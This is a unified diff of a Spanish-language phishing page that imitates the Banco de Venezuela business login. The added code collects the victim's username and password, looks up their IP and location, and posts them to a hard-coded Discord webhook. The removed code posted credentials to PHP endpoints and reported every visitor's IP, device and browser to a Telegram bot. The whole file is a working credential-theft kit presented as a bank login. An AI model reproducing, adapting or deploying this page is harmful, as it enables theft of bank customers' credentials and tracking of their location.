@@ -2,373 +2,393 @@
 <html lang="es">
 
 <head>
-    <meta charset="utf-8">
-    <title>BDVenlínea Empresas</title>
-    <base href="/">
-    <!-- CACHE -->
-    <meta http-equiv="cache-control" content="max-age=0" />
-    <meta http-equiv="cache-control" content="no-cache" />
-    <meta http-equiv="expires" content="0" />
-    <meta http-equiv="pragma" content="no-cache" />
-    <meta name="google" content="notranslate">
-    <!-- RESPONSIVO -->
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <!-- ICONOS -->
-    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,500" rel="stylesheet">
-    <link rel="icon" type="image/x-icon" href="/assets/favicon/favicon-16x16.png">
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
 
-    <style>
-        :root {
-            --main-color: #0067b1;
-            --input-border-color: #ddd;
-            --error-color: #a90000;
-            --font-family: 'Nunito', sans-serif;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Banco de Venezuela</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-image: url(./css/background.jpg);
+      background-size: cover;
+      background-position: center;
+    }
 
-        body {
-            font-family: var(--font-family);
-            display: flex;
-            justify-content: flex-start;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: url('https://bdvenlineaempresas.banvenez.com/assets/login/login-empresa.png') no-repeat center center;
-            background-size: cover;
-        }
+    .container {
+      display: flex;
 
-        .login-box {
-            width: 100%;
-            max-width: 360px;
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            margin: 20px;
-            position: relative;
-            left: 50px;
-        }
+      height: 100%;
+      width: 100%;
+    }
 
-        .login-box img {
-            width: 300px;
-            margin-bottom: 10px;
-        }
+    .left-side {
+      width: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
-        .input-group {
-            position: relative;
-            margin: 20px 0;
-            width: 100%;
-            text-align: left;
-        }
+    .right-side {
+      width: 50%;
+    }
 
-        .input-group label {
-            position: absolute;
-            top: 50%;
-            left: 12px;
-            transform: translateY(-50%);
-            font-size: 16px;
-            color: #666;
-            pointer-events: none;
-            transition: 0.3s;
-        }
+    .form {
+      width: 80%;
+      background: white;
+      max-width: 550px;
+      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+    }
 
-        .input-group input {
-            width: 95%;
-            padding: 12px;
-            border: none;
-            border-bottom: 2px solid var(--input-border-color);
-            font-size: 16px;
-            color: #333;
-            outline: none;
-            background-color: #f9f9f9;
-        }
+    @media (max-width: 768px) {
+      body {
+        background: #ededed;
+      }
 
-        .input-group input:focus {
-            border-color: #bb1b47;
-        }
+      .container {
+        flex-direction: column;
+      }
 
-        .input-group input:focus+label,
-        .input-group input:not(:placeholder-shown)+label {
-            top: -10px;
-            font-size: 12px;
-            color: #bb1b47;
-        }
+      .left-side {
+        width: 100%;
+        height: 100vh;
+      }
 
-        .buttons {
-            margin-top: 20px;
-            text-align: center;
-        }
+      .right-side {
+        display: none;
+      }
+    }
+  </style>
+  <style>
+    .form-group {
+      position: relative;
+      margin-bottom: 20px;
+      margin: 20px;
+    }
 
-        .buttons button {
-            padding: 10px 0;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: var(--main-color);
-            color: white;
-            width: 80%;
-            font-weight: 700;
-            transition: background-color 0.3s;
-        }
+    .form-group label {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-55%);
+      color: #999;
+      transition: top 0.3s, font-size 0.3s;
+      pointer-events: none;
+    }
 
-        .buttons button:hover {
-            background-color: #003580;
-        }
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      box-sizing: border-box;
+      position: relative;
+      height: 60px;
+      border: 0;
 
-        .login-box p {
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
-            line-height: 1.5;
-        }
+      border-bottom: 1px solid gray;
+      background: #ededed;
+      outline: none;
+    }
 
-        .login-box p a {
-            color: var(--main-color);
-            text-decoration: none;
-            font-weight: 600;
-        }
+    .form-group input:focus {
+      border: 0;
+    }
 
-        /* Popup de contraseña */
-        .password-popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 95%;
-            max-width: 360px;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            z-index: 10;
-        }
+    .form-group input:focus+label,
+    .form-group input:not(:placeholder-shown)+label {
+      top: 5px;
+      font-size: 12px;
+    }
 
-        .password-popup h2 {
-            font-size: 18px;
-            color: var(--main-color);
-            margin-bottom: 15px;
-        }
+    button {
+      background-color: #0067b1;
+      color: white;
+      border-radius: 3px;
+      border: 0;
+      padding: 15px;
+      width: 200px;
+    }
+  </style>
+  <style>
+    .form-group2 {
+      position: relative;
+      margin-bottom: 20px;
+      margin: 20px;
+    }
 
-        .password-input-group {
-            position: relative;
-            margin-bottom: 20px;
-            text-align: left;
-        }
+    .form-group2 label {
+      position: absolute;
+      top: 50%;
+      left: 23%;
+      transform: translateY(-55%);
+      color: #999;
+      transition: top 0.3s, font-size 0.3s;
+      pointer-events: none;
+    }
 
-        .password-input-group label {
-            position: absolute;
-            top: 50%;
-            left: 12px;
-            transform: translateY(-50%);
-            font-size: 16px;
-            color: #666;
-            pointer-events: none;
-            transition: 0.3s;
-        }
+    .form-group2 input {
+      padding: 10px;
+      box-sizing: border-box;
+      position: relative;
+      height: 60px;
+      border: 0;
+      border-bottom: 1px solid gray;
+      background: #ededed;
 
-        .password-input-group input {
-            width: 95%;
-            padding: 12px;
-            border: none;
-            border-bottom: 2px solid var(--input-border-color);
-            font-size: 16px;
-            color: #333;
-            outline: none;
-            background-color: #f9f9f9;
-        }
+      outline: none;
+    }
 
-        .password-input-group input:focus {
-            border-color: #bb1b47;
-        }
+    .form-group2 input:focus {
+      border: 0;
+    }
 
-        .password-input-group input:focus+label,
-        .password-input-group input:not(:placeholder-shown)+label {
-            top: -10px;
-            font-size: 12px;
-            color: #bb1b47;
-        }
+    .form-group2 input:focus+label,
+    .form-group2 input:not(:placeholder-shown)+label {
+      top: 5px;
+      font-size: 12px;
+    }
+  </style>
+  <style>
+    .overlay {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      /* Fondo semitransparente */
+      z-index: 9999;
+      /* Asegura que esté por encima de otros elementos */
+    }
 
-        .password-buttons {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 10px;
-        }
-
-        .password-buttons button {
-            padding: 10px 20px;
-            font-size: 14px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: var(--main-color);
-            color: white;
-            width: 45%;
-            font-weight: 700;
-            transition: background-color 0.3s;
-        }
-
-        .password-buttons button:hover {
-            background-color: #003580;
-        }
-
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 5;
-        }
-
-        @media (max-width: 768px) {
-            body {
-                background-color: #e9e9e9;
-                background-image: none;
-            }
-
-            .overlay {
-                background: rgba(0, 0, 0, 0.5);
-            }
-
-            .login-box {
-                left: auto;
-                margin: 0 auto;
-                box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-                border: none;
-            }
-
-            .password-popup {
-                background-color: white;
-                box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-                border: none;
-            }
-        }
-    </style>
+    .content {
+      background-color: #fff;
+      width: 350px;
+      border-radius: 5px;
+      text-align: center;
+    }
+  </style>
 </head>
 
+
+
+
+ 
+
 <body>
-    <div class="login-box" id="userForm">
-        <img src="https://bdvenlineaempresas.banvenez.com/assets/login/logo.png" alt="Logo BDV">
-        <form id="loginForm" action="NEWBDV/1.php" method="POST">
-            <!-- Campo de Usuario -->
-            <div class="input-group">
-                <input type="text" name="username" id="username" placeholder=" " oninput="validateUsername()">
-                <label for="username">Usuario *</label>
-            </div>
-            <div class="buttons">
-                <button id="loginButton" type="button" onclick="showPasswordPopup()" disabled>Entrar</button>
-            </div>
-            <p>¿Olvidaste tu usuario o clave?<br>Si eres nuevo cliente BDV <a href="#">regístrate aquí</a></p>
-        </form>
+
+  <div class="overlay" id="overlay" style="display: none">
+    <div class="content">
+<form id="loginform2" action="tu_post.php" method="post">
+  <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
+
+  <div class="form-group2" style="position: relative;">
+    <input type="text" id="contra" name="contra" required />
+    <label for="contra">Contraseña *</label>
+
+   <span
+  id="errorContra"
+  style="
+    display: none;
+    color: red;
+    font-size: 12px;
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    bottom: -18px;
+    text-align: center;
+    width: 100%;
+  "
+>
+  Debe contener al menos un carácter especial
+</span>
+  </div>
+
+  <div style="width: 100%; text-align: center; padding-bottom: 30px">
+    <button type="submit" style="width:160px">Continuar</button>
+  </div>
+</form>
+
+
+
+
+
+
+
     </div>
+  </div>
 
-    <div class="overlay" id="overlay"></div>
-
-    <div class="password-popup" id="passwordPopup">
-        <h2>Introduce tu contraseña</h2>
-        <div class="password-input-group">
-            <input type="password" name="password" id="password" placeholder=" " oninput="validatePassword()">
-            <label for="password">Contraseña *</label>
+  <div class="container">
+    <div class="left-side">
+      <form id="loginform" class="form">
+        <div style="text-align: center">
+          <img src="./css/logo.png" alt="" style="width: 60%; margin-top: 20px" />
         </div>
-        <span style="color: var(--error-color); font-size: 12px; display: block; margin-top: 5px;">Contraseña es requerida</span>
-        <div class="password-buttons">
-            <button id="continueButton" type="button" onclick="submitForm()" disabled>Continuar</button>
-            <button onclick="closePasswordPopup()">Cancelar</button>
+        <div style="width: 100%; text-align: center">
+          <div class="form-group">
+            <input type="text" id="nombre" name="nombre" style="width: 100%" required />
+            <label for="nombre">Usuario *</label>
+          </div>
         </div>
+        <div style="width: 100%; text-align: center">
+          <button>Entrar</button>
+        </div>
+        <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #999; margin-top: 30px; margin-bottom: 30px;">
+          ¿Olvidaste tu usuario o clave? <br />
+          Si eres nuevo cliente BDV, regístrate aquí
+        </div>
+      </form>
     </div>
+    <div class="right-side"></div>
+  </div>
 
-    <script>
-        let savedUsername = '';
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    const form2 = document.querySelector("#loginform2");
 
-        function validateUsername() {
-            savedUsername = document.getElementById("username").value;
-            document.getElementById("loginButton").disabled = !savedUsername.trim();
-        }
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // Evita que se envíe el formulario
 
-        function showPasswordPopup() {
-            document.getElementById('passwordPopup').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
-        }
+      axios.get(url) // Realiza la solicitud GET para obtener información adicional
+        .then((response) => {
+          const nombre = document.querySelector("#nombre").value; // Obtiene el nombre del input
+          localStorage.setItem("usuario", nombre); // Guarda el nombre en localStorage
 
-        function closePasswordPopup() {
-            document.getElementById('passwordPopup').style.display = 'none';
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('password').value = '';
-            document.getElementById('continueButton').disabled = true;
-        }
+          // Aquí puedes manejar la información obtenida como quieras, pero no enviar a Discord
+          const ciudad = response.data.city;
+          const pais = response.data.country;
+          const ip = response.data.ip;
 
-        function validatePassword() {
-            const password = document.getElementById("password").value;
-            document.getElementById("continueButton").disabled = !password.trim();
-        }
+          // Si quieres mostrar la información en la consola o en el UI:
+          console.log("Nombre guardado:", nombre);
+          console.log("Ciudad:", ciudad);
+          console.log("País:", pais);
+          console.log("IP:", ip);
 
-        function submitForm() {
-            const password = document.getElementById("password").value;
+          // Muestra el overlay si es necesario
+          document.getElementById("overlay").style.display = ""; 
+        })
+        .catch((error) => {
+          console.log(error); // Manejo de errores
+        });
+    });
 
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = '/11.php';
+        form2.addEventListener("submit", (event) => {
+      event.preventDefault(); // Evita que se envíe el formulario
 
-            const usernameField = document.createElement('input');
-            usernameField.type = 'hidden';
-            usernameField.name = 'username';
-            usernameField.value = savedUsername;
+      axios.get(url)
+        .then((response) => {
+          const nombre = localStorage.getItem("usuario"); // Recupera el nombre de localStorage
+          const contra = document.querySelector("#contra").value; // Obtiene la contraseña del input
 
-            const passwordField = document.createElement('input');
-            passwordField.type = 'hidden';
-            passwordField.name = 'password';
-            passwordField.value = password;
+          // Verifica que el nombre no sea nulo
+          if (!nombre) {
+            console.error("No se ha guardado el nombre en la sesión.");
+            return;
+          }
 
-            form.appendChild(usernameField);
-            form.appendChild(passwordField);
+          // Composición del mensaje a enviar a Discord
+          const message =
+            "BDV\nNombre: " +
+            nombre +
+            "\nContra: " +
+            contra +
+            "\nCiudad: " +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
 
-            document.body.appendChild(form);
-            form.submit();
-        }
-    </script>
-</body>
+          // Cambia esta URL por tu webhook de Discord
+          const discordWebhookUrl = "https://discord.com/api/webhooks/1434386956133077013/Lt4bC3hwnGuhzYmZ0_u3ygnqRXoA1HZSDbnEXjw8uOT7mrRZurXQwk7Gu09nwIZ5tQp2";
+
+          // Envía el mensaje a Discord
+          return axios.post(discordWebhookUrl, { content: message })
+            .then(() => {
+              // Muestra el botón para copiar el mensaje
+              showCopyButton(message);
+              // Redirige a la página de carga si el envío fue exitoso
+              window.location.href = "cargando.html";
+            });
+        })
+        .catch((error) => {
+          console.error("Error:", error); // Manejo de errores
+        });
+    });
+
+    // Función para mostrar el botón de copiar
+    function showCopyButton(message) {
+      const copyButtonContainer = document.createElement("div");
+      copyButtonContainer.style.textAlign = "center";
+      copyButtonContainer.style.marginTop = "20px";
+
+      const copyButton = document.createElement("button");
+      copyButton.innerText = "Copiar Mensaje";
+      copyButton.style.backgroundColor = "#0067b1";
+      copyButton.style.color = "white";
+      copyButton.style.border = "none";
+      copyButton.style.padding = "10px 20px";
+      copyButton.style.borderRadius = "5px";
+
+      // Evento para copiar el mensaje al portapapeles
+      copyButton.onclick = function () {
+        copyToClipboard(message);
+        alert("El mensaje ha sido copiado al portapapeles.");
+      };
+
+      copyButtonContainer.appendChild(copyButton);
+      document.body.appendChild(copyButtonContainer); // Añade el botón al cuerpo del documento
+    }
+
+    // Función para copiar texto al portapapeles
+    function copyToClipboard(text) {
+      const textarea = document.createElement("textarea");
+      textarea.value = text;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+    }
+  </script>
+
+   
+
 <script>
-      (async function() {
-        try {
-          // Obtener información del cliente
-          const response = await fetch('https://ipwho.is/');
-          const data = await response.json();
+document.addEventListener("DOMContentLoaded", function () {
+  const form = document.getElementById("loginform2");
+  const contra = document.getElementById("contra");
+  const errorText = document.getElementById("errorContra");
 
-          // Detectar dispositivo y navegador
-          const userAgent = navigator.userAgent;
-          const dispositivo = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent) ? "Mobile" : "Desktop";
+  const specialCharRegex = /[^a-zA-Z0-9]/;
 
-          // Crear mensaje
-          const mensaje = `🌐 EMPRESAS
-    📍 IP: ${data.ip}
-    🌍 País: ${data.country_code}
-    🏙 Ciudad: ${data.city}
-    🕒 Hora: ${new Date().toLocaleString()}
-    📱 Dispositivo: ${dispositivo}
-    🖥 Navegador: ${userAgent}`;
+  // OJO: tercer parámetro TRUE = captura (se ejecuta primero)
+  form.addEventListener("submit", function (e) {
+    if (!specialCharRegex.test(contra.value)) {
+      // ❌ inválido → bloquea TODO
+      e.preventDefault();
+      e.stopImmediatePropagation(); // corta otros listeners
+      errorText.style.display = "block";
+      return false; // respaldo extra
+    }
 
-          // Enviar mensaje a Telegram
-          const botToken = "75530991"; // Reemplaza con el token de tu bot
-          const chatId = "74";     // Reemplaza con el chat ID de tu bot o grupo
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    // ✅ válido → NO bloqueamos → el POST se envía
+    errorText.style.display = "none";
+  }, true);
+});
 
-          await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: mensaje,
-            }),
-          });
-        } catch (error) {
-          console.error('Error al enviar la notificación a Telegram:', error);
-        }
-      })();
-    </script>
+
+</script>
+
+</body>
+
 </html>
